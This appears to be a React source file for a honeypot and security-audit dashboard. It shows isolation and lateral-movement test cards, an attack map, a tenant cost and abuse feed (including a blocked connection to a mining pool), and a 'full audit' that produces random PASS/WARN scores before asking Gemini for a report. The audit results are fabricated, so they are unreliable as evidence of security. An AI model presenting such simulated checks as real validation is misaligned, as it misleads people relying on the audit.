               <div className="flex items-center gap-3 mb-4">
                  <div className="p-2 bg-blue-500/10 rounded-lg text-blue-500"><BrickWall size={20}/></div>
                  <h3 className="font-bold text-lg text-white">Tenant Isolation</h3>
               </div>
               <p className="text-sm text-slate-400 mb-6 flex-1">Simulates IDOR and Cross-Tenant SQLi attacks to verify data boundary integrity.</p>
               <div className="space-y-2 mb-6">
                  <div className="flex justify-between text-xs text-slate-500"><span>IDOR Check</span><span className="text-haas-success">PASS</span></div>
                  <div className="flex justify-between text-xs text-slate-500"><span>SQLi Scanner</span><span className="text-haas-success">PASS</span></div>
                  <div className="flex justify-between text-xs text-slate-500"><span>JWT Tamper</span><span className="text-haas-success">PASS</span></div>
               </div>
               <button onClick={() => runTest('isolation')} disabled={!!testRunning} className="w-full py-2 rounded bg-blue-600 hover:bg-blue-500 text-white font-bold text-sm transition-colors flex justify-center items-center gap-2">
                  {testRunning === 'isolation' ? <RefreshCw className="animate-spin" size={16}/> : <Play size={16}/>} Validate Isolation
               </button>
            </div>

            {/* Zero Trust */}
            <div className="bg-haas-card border border-white/10 rounded-xl p-6 glow-box flex flex-col">
               <div className="flex items-center gap-3 mb-4">
                  <div className="p-2 bg-haas-accent/10 rounded-lg text-haas-accent"><ShieldCheck size={20}/></div>
                  <h3 className="font-bold text-lg text-white">Zero Trust Network</h3>
               </div>
               <p className="text-sm text-slate-400 mb-6 flex-1">Verifies K8s NetworkPolicies, mTLS enforcement, and default-deny rules.</p>
               <div className="h-24 bg-black/40 rounded mb-6 border border-white/5 relative overflow-hidden flex items-center justify-center">
                  <div className="absolute inset-0 flex items-center justify-center gap-8 opacity-50">
                     <div className="w-8 h-8 bg-slate-700 rounded flex items-center justify-center text-xs">POD</div>
                     <div className="h-px w-8 bg-red-500 relative"><XCircle size={12} className="absolute -top-1.5 left-3 text-red-500 bg-black"/></div>
                     <div className="w-8 h-8 bg-slate-700 rounded flex items-center justify-center text-xs">DB</div>
                  </div>
                  <div className="z-10 text-xs font-bold text-slate-300 bg-black/80 px-2 py-1 rounded">Policy: DENY ALL</div>
               </div>
               <button onClick={() => runTest('zerotrust')} disabled={!!testRunning} className="w-full py-2 rounded bg-haas-accent hover:bg-haas-accent-dark text-white font-bold text-sm transition-colors flex justify-center items-center gap-2">
                  {testRunning === 'zerotrust' ? <RefreshCw className="animate-spin" size={16}/> : <Play size={16}/>} Verify Policies
               </button>
            </div>

            {/* Lateral Movement */}
            <div className="bg-haas-card border border-white/10 rounded-xl p-6 glow-box flex flex-col">
               <div className="flex items-center gap-3 mb-4">
                  <div className="p-2 bg-haas-danger/10 rounded-lg text-haas-danger"><Sword size={20}/></div>
                  <h3 className="font-bold text-lg text-white">Lateral Movement</h3>
               </div>
               <p className="text-sm text-slate-400 mb-6 flex-1">Simulates container escape and privilege escalation attempts from compromised pods.</p>
               <div className="space-y-2 mb-6">
                   <div className="flex justify-between text-xs text-slate-500"><span>ServiceAccount Mount</span><span className="text-haas-success">BLOCKED</span></div>
                   <div className="flex justify-between text-xs text-slate-500"><span>Privileged Mode</span><span className="text-haas-success">DISABLED</span></div>
                   <div className="flex justify-between text-xs text-slate-500"><span>Root Filesystem</span><span className="text-haas-success">READ-ONLY</span></div>
               </div>
               <button onClick={() => runTest('lateral')} disabled={!!testRunning} className="w-full py-2 rounded bg-haas-danger hover:bg-red-600 text-white font-bold text-sm transition-colors flex justify-center items-center gap-2">
                  {testRunning === 'lateral' ? <RefreshCw className="animate-spin" size={16}/> : <Play size={16}/>} Simulate Attack
               </button>
            </div>
         </div>
      </div>
   );
}

function WorldMap() {
  // Simplified SVG World Map with Attack Markers
  return (
    <div className="w-full h-full bg-[#0B0F1A] flex items-center justify-center relative">
      <svg viewBox="0 0 1000 500" className="w-full h-full opacity-40">
        <path d="M 50 150 Q 150 50 300 150 T 500 150 T 700 150 T 950 150 V 400 H 50 Z" fill="none" /> 
        {/* Placeholder for complex map paths - Using stylized dot grid for cyber aesthetic */}
        <pattern id="grid" width="20" height="20" patternUnits="userSpaceOnUse">
           <circle cx="2" cy="2" r="1" fill="#334155" />
        </pattern>
        <rect width="1000" height="500" fill="url(#grid)" />
        
        {/* Continents (Simplified Shapes) */}
        <path d="M 200,100 L 350,120 L 320,300 L 250,400 L 180,300 Z" fill="#1e293b" stroke="#334155" strokeWidth="2" /> {/* Americas */}
        <path d="M 450,100 L 600,80 L 650,200 L 550,350 L 480,200 Z" fill="#1e293b" stroke="#334155" strokeWidth="2" /> {/* EMEA */}
        <path d="M 700,80 L 900,100 L 850,300 L 750,250 Z" fill="#1e293b" stroke="#334155" strokeWidth="2" /> {/* APAC */}
      </svg>

      {/* Attack Markers (Pulsing) */}
      <div className="absolute top-[30%] left-[25%] group">
         <div className="w-3 h-3 bg-haas-danger rounded-full animate-ping absolute"></div>
         <div className="w-3 h-3 bg-haas-danger rounded-full relative cursor-pointer border border-white/20"></div>
         <div className="hidden group-hover:block absolute bottom-4 left-4 bg-black/80 border border-white/10 p-2 rounded text-[10px] w-32 backdrop-blur-md z-20">
            <div className="font-bold text-white">Origin: US-East</div>
            <div className="text-haas-danger">Critical: Botnet C2</div>
         </div>
      </div>
      <div className="absolute top-[45%] left-[55%] group">
         <div className="w-2 h-2 bg-haas-warning rounded-full animate-ping absolute"></div>
         <div className="w-2 h-2 bg-haas-warning rounded-full relative cursor-pointer border border-white/20"></div>
         <div className="hidden group-hover:block absolute bottom-4 left-4 bg-black/80 border border-white/10 p-2 rounded text-[10px] w-32 backdrop-blur-md z-20">
            <div className="font-bold text-white">Origin: Nigeria</div>
            <div className="text-haas-warning">Warn: SSH Brute</div>
         </div>
      </div>
       <div className="absolute top-[35%] left-[75%] group">
         <div className="w-4 h-4 bg-blue-500 rounded-full animate-pulse absolute opacity-50"></div>
         <div className="w-2 h-2 bg-blue-500 rounded-full relative cursor-pointer border border-white/20"></div>
          <div className="hidden group-hover:block absolute bottom-4 left-4 bg-black/80 border border-white/10 p-2 rounded text-[10px] w-32 backdrop-blur-md z-20">
            <div className="font-bold text-white">Origin: China</div>
            <div className="text-blue-400">Info: Port Scan</div>
         </div>
      </div>
    </div>
  );
}

function CostControlView({ context }: { context: string }) {
  const [tenants, setTenants] = useState([
     { name: 'CyberDyne Systems', plan: 'Enterprise', usage: 85, aiTokens: '800k', cost: 1200, revenue: 2500, margin: 52, status: 'Active', risk: 12 },
     { name: 'Tyrell Corp', plan: 'Pro', usage: 45, aiTokens: '120k', cost: 150, revenue: 400, margin: 62, status: 'Active', risk: 5 },
     { name: 'Massive Dynamic', plan: 'Starter', usage: 98, aiTokens: '950k', cost: 180, revenue: 50, margin: -260, status: 'Throttled', risk: 95 },
     { name: 'Soylent Corp', plan: 'Pro', usage: 10, aiTokens: '5k', cost: 40, revenue: 400, margin: 90, status: 'Active', risk: 2 },
  ]);
  
  const [abuseEvents, setAbuseEvents] = useState([
     { time: '10:05:01', tenant: 'Massive Dynamic', type: 'CPU_SPIKE', action: 'ALERT', details: 'Pod CPU > 95% (Mining?)' },
     { time: '10:05:15', tenant: 'Massive Dynamic', type: 'EGRESS_BLOCK', action: 'BLOCK', details: 'Blocked TCP connect to xmr.pool.com' },
     { time: '10:06:22', tenant: 'CyberDyne Systems', type: 'LOG_FLOOD', action: 'THROTTLE', details: 'Rate limit exceeded (1200/min)' },
  ]);

  return (
    <div className="space-y-6 animate-in slide-in-from-bottom-4 duration-500">
      <div className="flex justify-between items-start">
         <div>
            <h2 className="text-2xl font-bold text-white glow-text">Cost Control & Abuse Protection</h2>
            <p className="text-slate-400 mt-1">Manage tenant margins, enforce quotas, and prevent infrastructure abuse.</p>
         </div>
         <div className="flex gap-2">
            <div className="px-3 py-1 bg-haas-danger/10 border border-haas-danger/20 rounded text-xs font-bold text-haas-danger flex items-center gap-2">
               <Ban size={14} /> Global Egress Blocked
            </div>
            <div className="px-3 py-1 bg-blue-500/10 border border-blue-500/20 rounded text-xs font-bold text-blue-400 flex items-center gap-2">
               <Scale size={14} /> Legal Audit: Active
            </div>
         </div>
      </div>

      {/* KPI Stats */}
      <div className="grid grid-cols-1 md:grid-cols-4 gap-4">
         <div className="bg-haas-card border border-white/10 p-4 rounded-xl flex items-center justify-between glow-box">
             <div><div className="text-slate-500 text-[10px] uppercase font-bold">Total Monthly Revenue</div><div className="text-xl font-bold text-white font-mono">$3,350</div></div>
             <DollarSign className="text-haas-success opacity-50" />
         </div>
         <div className="bg-haas-card border border-white/10 p-4 rounded-xl flex items-center justify-between glow-box">
             <div><div className="text-slate-500 text-[10px] uppercase font-bold">Infra Cost (Est)</div><div className="text-xl font-bold text-slate-300 font-mono">$1,570</div></div>
             <Server className="text-slate-500 opacity-50" />
         </div>
         <div className="bg-haas-card border border-white/10 p-4 rounded-xl flex items-center justify-between glow-box">
             <div><div className="text-slate-500 text-[10px] uppercase font-bold">Net Margin</div><div className="text-xl font-bold text-haas-success font-mono">53.1%</div></div>
             <TrendingUp className="text-haas-success opacity-50" />
         </div>
          <div className="bg-haas-card border border-white/10 p-4 rounded-xl flex items-center justify-between glow-box">
             <div><div className="text-slate-500 text-[10px] uppercase font-bold">Active Suspensions</div><div className="text-xl font-bold text-haas-danger font-mono">1</div></div>
             <Gavel className="text-haas-danger opacity-50" />
         </div>
      </div>

      <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
         {/* Tenant Cost Table */}
         <div className="lg:col-span-2 bg-haas-card border border-white/10 rounded-xl overflow-hidden glow-box">
            <div className="p-4 border-b border-white/10 bg-black/20 flex justify-between items-center">
               <h3 className="font-bold text-slate-200 flex items-center gap-2"><Users size={16}/> Tenant Margin Analysis</h3>
               <button className="text-xs text-blue-400 hover:text-white transition-colors">Download CSV</button>
            </div>
            <table className="w-full text-sm text-left">
               <thead className="bg-white/5 text-xs text-slate-500 uppercase font-bold">
                  <tr>
                     <th className="px-4 py-3">Tenant</th>
                     <th className="px-4 py-3">Plan</th>
                     <th className="px-4 py-3">Quota</th>
                     <th className="px-4 py-3 text-right">Cost</th>
                     <th className="px-4 py-3 text-right">Rev</th>
                     <th className="px-4 py-3 text-right">Margin</th>
                     <th className="px-4 py-3 text-center">Status</th>
                  </tr>
               </thead>
               <tbody className="divide-y divide-white/5">
                  {tenants.map((t, i) => (
                     <tr key={i} className="hover:bg-white/5 transition-colors">
                        <td className="px-4 py-3 font-medium text-slate-200">{t.name}</td>
                        <td className="px-4 py-3 text-slate-400 text-xs">{t.plan}</td>
                        <td className="px-4 py-3">
                           <div className="w-20 bg-black/40 h-1.5 rounded-full overflow-hidden">
                              <div className={cn("h-full rounded-full", t.usage > 90 ? "bg-haas-danger" : "bg-haas-accent")} style={{width: `${t.usage}%`}}></div>
                           </div>
                        </td>
                        <td className="px-4 py-3 text-right font-mono text-slate-400">${t.cost}</td>
                        <td className="px-4 py-3 text-right font-mono text-slate-200">${t.revenue}</td>
                        <td className={cn("px-4 py-3 text-right font-bold font-mono", t.margin > 30 ? "text-haas-success" : "text-haas-danger")}>
                           {t.margin}%
                        </td>
                         <td className="px-4 py-3 text-center">
                            <span className={cn("text-[10px] px-2 py-0.5 rounded font-bold border", 
                               t.status === 'Active' ? "bg-haas-success/10 text-haas-success border-haas-success/20" : "bg-haas-danger/10 text-haas-danger border-haas-danger/20"
                            )}>{t.status}</span>
                         </td>
                     </tr>
                  ))}
               </tbody>
            </table>
         </div>

         {/* Abuse Feed */}
         <div className="lg:col-span-1 flex flex-col gap-6">
            <div className="bg-haas-card border border-white/10 rounded-xl overflow-hidden glow-box flex-1">
               <div className="p-4 border-b border-white/10 bg-haas-danger/10 flex items-center justify-between">
                  <h3 className="font-bold text-haas-danger flex items-center gap-2"><Siren size={16} className="animate-pulse"/> Abuse Prevention Feed</h3>
                  <div className="h-2 w-2 rounded-full bg-haas-danger animate-ping"></div>
               </div>
               <div className="p-0 overflow-y-auto max-h-[300px] custom-scrollbar">
                  {abuseEvents.map((ev, i) => (
                     <div key={i} className="p-3 border-b border-white/5 hover:bg-white/5 transition-colors text-xs">
                        <div className="flex justify-between items-center mb-1">
                           <span className="font-bold text-slate-300">{ev.tenant}</span>
                           <span className="text-slate-500 font-mono">{ev.time}</span>
                        </div>
                        <div className="flex gap-2 mb-1">
                           <span className="bg-white/10 px-1.5 rounded text-[10px] font-bold">{ev.type}</span>
                           <span className={cn("px-1.5 rounded text-[10px] font-bold", ev.action === 'BLOCK' ? 'bg-haas-danger text-white' : 'bg-haas-warning text-black')}>{ev.action}</span>
                        </div>
                        <div className="text-slate-400">{ev.details}</div>
                     </div>
                  ))}
               </div>
            </div>

            <div className="bg-haas-card border border-white/10 rounded-xl p-4 glow-box">
               <h3 className="font-bold text-slate-200 mb-3 text-sm flex items-center gap-2"><Network size={16}/> Egress Policy Visualizer</h3>
               <div className="bg-black/40 p-3 rounded border border-white/5 font-mono text-[10px] text-slate-300">
                  <div className="text-slate-500"># K8s NetworkPolicy: Default Deny</div>
                  <div className="mt-1"><span className="text-blue-400">podSelector:</span> matchLabels: app=honeypot</div>
                  <div className="mt-1"><span className="text-haas-danger">policyTypes:</span> [Egress]</div>
                  <div className="mt-1"><span className="text-haas-success">egress:</span></div>
                  <div className="pl-2">- <span className="text-blue-400">to:</span> cidr: 0.0.0.0/0</div>
                  <div className="pl-2">  <span className="text-yellow-400">ports:</span> - protocol: TCP, port: 443</div>
                  <div className="pl-4 text-slate-500"># ONLY API ALLOWED</div>
               </div>
            </div>
         </div>
      </div>
    </div>
  );
}

function SystemValidationView() {
  const [currentPhase, setCurrentPhase] = useState<number>(-1);
  const [logs, setLogs] = useState<string[]>([]);
  const [results, setResults] = useState<any[]>([]);
  const [report, setReport] = useState<any>(null);

  const phases = [
    { title: "Phase 1: Core Backend", icon: <Database size={16} />, logs: ["Testing JWT Issuance...", "Verifying Multi-Tenant Isolation...", "Checking Log Ingestion Integrity...", "Simulating 10 Tenants / 100 Users..."] },
    { title: "Phase 2: Kubernetes", icon: <Container size={16} />, logs: ["Checking Namespace Isolation...", "Testing NetworkPolicies...", "Attempting Lateral Movement...", "Verifying Resource Quotas..."] },
    { title: "Phase 3: AI Engine", icon: <Brain size={16} />, logs: ["Validating MITRE Mapping...", "Testing Anomaly Detection Models...", "Simulating Brute Force Pattern...", "Checking Threat Score Normalization..."] },
    { title: "Phase 4: Frontend", icon: <LayoutDashboard size={16} />, logs: ["Verifying Role-Based Rendering...", "Checking Chart Data Consistency...", "Testing Session Drill-Down...", "Validating Tenant Scoping..."] },
    { title: "Phase 5: Monitoring", icon: <Activity size={16} />, logs: ["Checking Prometheus Targets...", "Testing AlertManager Rules...", "Verifying Loki Log Ingestion...", "Simulating API Crash Event..."] },
    { title: "Phase 6: Enterprise", icon: <ShieldCheck size={16} />, logs: ["Enforcing mTLS Strict Mode...", "Testing Vault Secret Injection...", "Verifying WAF Rules (ModSecurity)...", "Simulating SQL Injection..."] },
    { title: "Phase 7: Billing", icon: <CreditCard size={16} />, logs: ["Verifying Stripe Webhooks...", "Testing Usage Metering Atomic Counters...", "Simulating Plan Downgrade...", "Checking Quota Blocks..."] },
    { title: "Phase 8: Threat Intel", icon: <Share2 size={16} />, logs: ["Building Attack Correlation Graph...", "Detecting Botnet Campaign...", "Verifying Cross-Tenant Privacy...", "Calculating Risk Propagation..."] },
    { title: "Phase 9: Public Launch", icon: <Rocket size={16} />, logs: ["Testing Public Ingress...", "Simulating DDoS Attack (10k req/s)...", "Checking Demo Mode Sandbox...", "Verifying AWS Cost Controls..."] },
  ];

  const runFullAudit = async () => {
    if (currentPhase !== -1) return;
    setCurrentPhase(0);
    setLogs([]);
    setResults([]);
    setReport(null);
    let collectedResults = [];

    for (let i = 0; i < phases.length; i++) {
      setCurrentPhase(i);
      for (const log of phases[i].logs) {
         setLogs(prev => [...prev, `[${phases[i].title.split(':')[0]}] ${log}`]);
         await new Promise(r => setTimeout(r, 600));
      }
      const result = {
        phase: phases[i].title,
        status: Math.random() > 0.1 ? 'PASS' : 'WARN',
        score: Math.floor(Math.random() * (100 - 85) + 85),
        details: "Validated successfully."
      };
      setResults(prev => [...prev, result]);
      collectedResults.push(result);
      setLogs(prev => [...prev, `✅ ${phases[i].title} Complete. Score: ${result.score}/100`]);
      await new Promise(r => setTimeout(r, 400));
    }
    
    setCurrentPhase(phases.length);
    setLogs(prev => [...prev, "generating Executive Report via Gemini AI..."]);

    try {
      const ai = new GoogleGenAI({ apiKey: process.env.API_KEY });
      const response = await ai.models.generateContent({
        model: "gemini-3-flash-preview",
        contents: FINAL_AUDIT_PROMPT.replace('{RESULTS_JSON}', JSON.stringify(collectedResults)),
        config: { responseMimeType: "application/json" }
      });
      if (response.text) {
        setReport(JSON.parse(response.text));
      }
    } catch (e) {
      console.error(e);
      setLogs(prev => [...prev, "❌ Failed to generate report."]);
    }
  };

  return (
    <div className="grid grid-cols-12 gap-6 h-[calc(100vh-140px)] animate-in fade-in duration-500">
      <div className="col-span-3 bg-haas-card border border-white/10 rounded-xl overflow-hidden flex flex-col glow-box">
         <div className="p-4 border-b border-white/10 bg-black/20">
            <h3 className="font-bold text-slate-200">Audit Sequence</h3>
            <p className="text-xs text-slate-500">End-to-End Verification Pipeline</p>
         </div>
         <div className="flex-1 overflow-y-auto p-2 space-y-1 custom-scrollbar">
            {phases.map((p, i) => (
               <div key={i} className={cn(
                  "flex items-center gap-3 p-3 rounded-lg text-sm transition-all",
                  i === currentPhase ? "bg-haas-accent/20 border border-haas-accent text-white" :
                  i < currentPhase ? "bg-haas-success/10 border border-haas-success/20 text-haas-success" :
                  "bg-white/5 border border-transparent text-slate-500"
               )}>
                  <div className={cn("h-2 w-2 rounded-full", i === currentPhase ? "bg-haas-accent animate-pulse" : i < currentPhase ? "bg-haas-success" : "bg-slate-600")}></div>
                  <span className="font-medium">{p.title.split(':')[0]}</span>
               </div>
            ))}
         </div>
         <div className="p-4 border-t border-white/10">
            <button 
               onClick={runFullAudit}
               disabled={currentPhase !== -1 && currentPhase < phases.length}
               className="w-full bg-gradient-to-r from-haas-accent to-haas-accent-dark text-white font-bold py-3 rounded-lg hover:shadow-[0_0_20px_rgba(255,107,53,0.4)] transition-all disabled:opacity-50 disabled:cursor-not-allowed flex items-center justify-center gap-2"
            >
               {currentPhase !== -1 && currentPhase < phases.length ? <RefreshCw className="animate-spin" size={18} /> : <Play size={18} />}
               {currentPhase === -1 ? 'Start Full Audit' : 'Audit Running...'}
            </button>
         </div>
      </div>
      <div className="col-span-5 flex flex-col gap-6">
         <div className="bg-black border border-white/10 rounded-xl p-4 font-mono text-xs overflow-hidden flex flex-col h-1/2 shadow-inner">
            <div className="flex-1 overflow-y-auto custom-scrollbar space-y-1">
               {logs.map((log, i) => (
                  <div key={i} className="text-slate-300 animate-in fade-in slide-in-from-left-2 duration-200">
                     <span className="text-slate-600 mr-2">{new Date().toLocaleTimeString()}</span>
                     {log.startsWith('✅') ? <span className="text-haas-success">{log}</span> : log}
                  </div>
               ))}
               <div ref={(el) => el?.scrollIntoView({ behavior: 'smooth' })} />
            </div>
         </div>
         <div className="bg-haas-card border border-white/10 rounded-xl p-4 flex-1 overflow-y-auto custom-scrollbar glow-box">
             <h3 className="font-bold text-slate-200 mb-4 flex items-center gap-2"><FileBarChart size={16}/> Phase Results</h3>
             <div className="grid grid-cols-1 gap-3">
                {results.map((r, i) => (
                   <div key={i} className="p-3 bg-white/5 rounded border border-white/5 flex justify-between items-center hover:bg-white/10 transition-all">
                      <div className="font-bold text-sm text-slate-200">{r.phase}</div>
                      <div className={cn("text-lg font-bold font-mono", r.score > 90 ? "text-haas-success" : "text-haas-warning")}>{r.score}/100</div>
                   </div>
                ))}
             </div>
         </div>
      </div>
      <div className="col-span-4 bg-haas-card border border-white/10 rounded-xl p-6 flex flex-col glow-box relative overflow-hidden">
         {!report ? (
            <div className="absolute inset-0 flex flex-col items-center justify-center bg-haas-panel/90 z-10 p-8 text-center">
               <ClipboardCheck size={64} className="text-slate-600 mb-4" />
               <h3 className="text-xl font-bold text-slate-400">Validation Pending</h3>
            </div>
         ) : (
            <div className="flex flex-col h-full animate-in zoom-in-95 duration-500">
               <div className="flex items-center justify-between mb-6 border-b border-white/10 pb-4">
                  <h2 className="text-2xl font-bold text-white">Executive Report</h2>
                  <div className={cn("px-4 py-1.5 rounded-full text-xs font-bold border", 
                     report.launch_readiness_rating === 'GO' ? "bg-haas-success/20 border-haas-success text-haas-success" : "bg-haas-warning/20 border-haas-warning text-haas-warning")}>
                     {report.launch_readiness_rating}
                  </div>
               </div>
               <div className="space-y-4 flex-1 overflow-y-auto custom-scrollbar">
                  <div>
                     <h4 className="text-xs font-bold text-slate-500 uppercase mb-2">Critical Risks</h4>
                     <ul className="space-y-2">{report.top_critical_risks?.map((risk: string, i: number) => <li key={i} className="flex gap-2 text-xs text-slate-300 bg-haas-danger/10 p-2 rounded border border-haas-danger/20"><AlertTriangle size={14} className="text-haas-danger shrink-0" />{risk}</li>)}</ul>
                  </div>
               </div>
            </div>
         )}
      </div>
    </div>
  );
}

function DataRecoveryView({ context }: { context: string }) {
  return (
     <div className="space-y-6 animate-in slide-in-from-bottom-4 duration-500">
        <h2 className="text-2xl font-bold text-white glow-text">Data & Recovery Control Center</h2>
        <div className="grid grid-cols-1 md:grid-cols-4 gap-4">
           <div className="bg-haas-card border border-white/10 p-4 rounded-xl flex items-center justify-between glow-box">
              <div><div className="text-slate-500 text-[10px] uppercase font-bold">RPO Target</div><div className="text-xl font-bold text-haas-success font-mono">5 Minutes</div></div>
           </div>
           <div className="bg-haas-card border border-white/10 p-4 rounded-xl flex items-center justify-between glow-box">
              <div><div className="text-slate-500 text-[10px] uppercase font-bold">RTO Target</div><div className="text-xl font-bold text-haas-success font-mono">60 Minutes</div></div>
           </div>
        </div>
     </div>
  );
}

function GenericAuditView({ title, context, prompt, simulationSteps, renderContent }: any) {
  const [status, setStatus] = useState<'idle' | 'scanning' | 'complete'>('idle');
  const [report, setReport] = useState<any>(null);

  const runAudit = async () => {
    setStatus('scanning');
    for (const step of simulationSteps) { await new Promise(r => setTimeout(r, 600)); }
    try {
      const ai = new GoogleGenAI({ apiKey: process.env.API_KEY });
      const response = await ai.models.generateContent({
        model: "gemini-3-flash-preview",
        contents: context + "\n" + prompt,
        config: { responseMimeType: "application/json" }
      });
      if (response.text) { setReport(JSON.parse(response.text)); setStatus('complete'); }
    } catch (e) { console.error(e); setStatus('idle'); }
  };

  return (
    <div className="space-y-6 animate-in slide-in-from-bottom-4 duration-500">
      <div className="flex justify-between items-start">
        <h2 className="text-2xl font-bold text-white glow-text">{title}</h2>
        <button onClick={runAudit} disabled={status === 'scanning'} className="bg-gradient-to-r from-haas-accent to-haas-accent-dark text-white px-6 py-2 rounded-md font-semibold flex items-center gap-2">
          {status === 'scanning' ? <RefreshCw className="animate-spin" size={18} /> : <Play size={18} />} {status === 'scanning' ? 'Scanning...' : 'Start Audit'}
        </button>
      </div>
      {status === 'complete' && report && renderContent(report)}
    </div>
  );
}

function K8sAuditView({ context }: { context: string }) {
    return <GenericAuditView title="Infrastructure Security Audit" context={context} prompt={K8S_AUDIT_PROMPT} simulationSteps={["Connecting to K8s...", "Scanning Namespaces...", "Checking RBAC..."]} renderContent={(report: any) => (
        <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
            <ScoreCard title="Security Readiness" score={report.readiness_score} />
            <div className="lg:col-span-2 space-y-6">
                <div className="bg-haas-card border border-white/10 rounded-xl p-4"><h3 className="font-bold text-slate-200">Critical Vulnerabilities</h3>{report.critical_issues?.map((issue: string, i: number) => <div key={i} className="text-slate-300 text-sm mt-2">• {issue}</div>)}</div>
            </div>
        </div>
    )} />;
}

function AIAuditView({ context }: { context: string }) {
    return <GenericAuditView title="AI Threat Intelligence Audit" context={context} prompt={AI_AUDIT_PROMPT} simulationSteps={["Analyzing Weights...", "Checking Bias..."]} renderContent={(report: any) => (
        <div className="grid grid-cols-1 lg:grid-cols-2 gap-6"><ScoreCard title="Detection Accuracy" score={report.detection_score} /></div>
    )} />;
}

function ThreatIntelAuditView({ context }: { context: string }) {
    return <GenericAuditView title="Threat Intelligence Audit" context={context} prompt={THREAT_INTEL_AUDIT_PROMPT} simulationSteps={["Analyzing Graph...", "Checking Campaigns..."]} renderContent={(report: any) => (
        <div className="grid grid-cols-1 lg:grid-cols-2 gap-6"><ScoreCard title="Intel Score" score={report.intelligence_sophistication_score} /></div>
    )} />;
}

function DevOpsAuditView({ context }: { context: string }) {
    return <GenericAuditView title="DevSecOps Audit" context={context} prompt={DEVOPS_AUDIT_PROMPT} simulationSteps={["Checking Pipeline...", "Scanning Images..."]} renderContent={(report: any) => (
        <div className="grid grid-cols-1 lg:grid-cols-2 gap-6"><ScoreCard title="DevOps Maturity" score={report.devops_maturity_score} /></div>
    )} />;
}

function EnterpriseAuditView({ context }: { context: string }) {
    return <GenericAuditView title="Enterprise Audit" context={context} prompt={ENTERPRISE_AUDIT_PROMPT} simulationSteps={["Checking mTLS...", "Auditing IAM..."]} renderContent={(report: any) => (
        <div className="grid grid-cols-1 lg:grid-cols-2 gap-6"><ScoreCard title="Enterprise Security" score={report.enterprise_security_score} /></div>
    )} />;
}

function BillingAuditView({ context }: { context: string }) {
    return <GenericAuditView title="Billing Audit" context={context} prompt={BILLING_AUDIT_PROMPT} simulationSteps={["Auditing Stripe...", "Verifying Usage..."]} renderContent={(report: any) => (
        <div className="grid grid-cols-1 lg:grid-cols-2 gap-6"><ScoreCard title="Billing Security" score={report.billing_security_score} /></div>
    )} />;
}

function PublicAuditView({ context }: { context: string }) {
    return <GenericAuditView title="Public Launch Audit" context={context} prompt={PUBLIC_AUDIT_PROMPT} simulationSteps={["Scanning Ingress...", "Checking DoS..."]} renderContent={(report: any) => (
        <div className="grid grid-cols-1 lg:grid-cols-2 gap-6"><ScoreCard title="Launch Readiness" score={report.public_readiness_score} /></div>
    )} />;
}

function StatCard({ title, value, icon, trend, isBad }: any) {
  return (
    <div className="bg-haas-card border border-white/5 p-4 rounded-xl flex flex-col justify-between glow-box">
      <div className="flex justify-between items-start mb-2"><div className="p-2 bg-white/5 rounded-lg">{icon}</div><div className={cn("text-xs font-bold px-2 py-1 rounded-full border", isBad ? "text-haas-danger border-haas-danger/20" : "text-haas-success border-haas-success/20")}>{trend}</div></div>
      <div><h4 className="text-slate-500 text-xs font-bold uppercase">{title}</h4><div className="text-2xl font-bold text-slate-100 mt-1">{value}</div></div>
    </div>
  );
}

function LogEntryRow({ time, level, source, event, payload, highlight }: any) {
  const levelColor = level === 'CRIT' || level === 'CRYPTO' ? 'text-haas-danger' : level === 'WARN' ? 'text-haas-warning' : 'text-blue-400';
  return (
    <div className={cn("grid grid-cols-12 gap-2 px-4 py-2 border-b border-white/5 hover:bg-white/5 transition-colors items-center", highlight && "bg-haas-danger/10")}>
      <div className="col-span-2 text-slate-500">{time}</div><div className={cn("col-span-1 font-bold", levelColor)}>{level}</div><div className="col-span-2 text-slate-400 truncate">{source}</div><div className="col-span-2 text-slate-300">{event}</div><div className="col-span-5 text-slate-500 truncate font-mono text-[10px]">{payload}</div>
    </div>
  );
}

function AttackRow({ ip, country, type, time, risk }: any) {
  return (
    <div className="flex items-center gap-3 p-3 bg-white/5 rounded-lg border border-white/5">
       <div className="h-8 w-8 rounded bg-black/40 flex items-center justify-center text-xs font-bold text-slate-500 border border-white/10">{country}</div>
       <div className="flex-1 min-w-0"><div className="flex justify-between mb-1"><span className="text-sm font-medium text-slate-200 truncate">{type}</span><span className="text-xs text-slate-500">{time}</span></div></div>
       <div className={cn("text-xs font-bold", risk > 80 ? "text-haas-danger" : "text-haas-warning")}>{risk}%</div>
    </div>
  );
}

function ScoreCard({ title, score }: any) {
  return (
    <div className="bg-haas-card border border-white/10 rounded-xl flex flex-col items-center justify-center p-8 glow-box">
       <div className="text-4xl font-bold text-haas-success">{score}</div>
       <h3 className="font-bold text-slate-400 mt-4 text-sm uppercase tracking-widest">{title}</h3>
    </div>
  );
}

const root = createRoot(document.getElementById('root')!);
root.render(<App />);